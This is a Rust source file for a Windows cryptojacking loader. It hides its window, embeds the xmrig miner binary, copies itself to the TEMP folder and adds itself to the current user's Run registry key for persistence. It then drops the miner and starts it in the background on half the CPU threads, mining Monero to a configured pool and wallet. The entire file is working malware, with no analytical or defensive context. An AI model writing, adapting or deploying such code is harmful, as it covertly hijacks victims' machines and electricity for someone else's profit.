#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod constants;
use std::{fs, path::Path, process::Command};
use winreg::{
    enums::{HKEY_CURRENT_USER, KEY_WRITE},
    RegKey,
};

fn main() {
    let binary = include_bytes!("../res/xmrig.exe");

    // Copies the loader and adds to startup
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("SOFTWARE")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let key = hkcu.open_subkey_with_flags(&path, KEY_WRITE).unwrap();

    let executable_path = std::env::current_exe().unwrap();
    let temp_env = std::env::var("TEMP").unwrap();

    if let Some(file_name) = executable_path.file_stem() {
        let mut new_path = Path::new(temp_env.as_str()).join(file_name);
        new_path.set_extension("exe");

        fs::copy(&executable_path, &new_path).unwrap();
        key.set_value(file_name, &new_path.as_os_str()).unwrap();
    }

    let drop_path = Path::new(temp_env.as_str()).join(constants::PAYLOAD_NAME);

    if !drop_path.exists() {
        fs::write(&drop_path, binary).unwrap();
    }

    let thread_count = num_cpus::get() / 2;

    // This is all documented here https://xmrig.com/docs/miner/command-line-options
    Command::new(drop_path)
        .args([
            "--background",
            &format!("--threads={}", thread_count),
            "--cpu-priority=5",
            &format!("--url={}", constants::POOL),
            "--algo=rx/0",
            &format!(
                "--user={}.{}",
                constants::MONERO_ADDRESS,
                constants::WORKER_NAME
            ),
        ])
        .spawn()
        .unwrap();
}
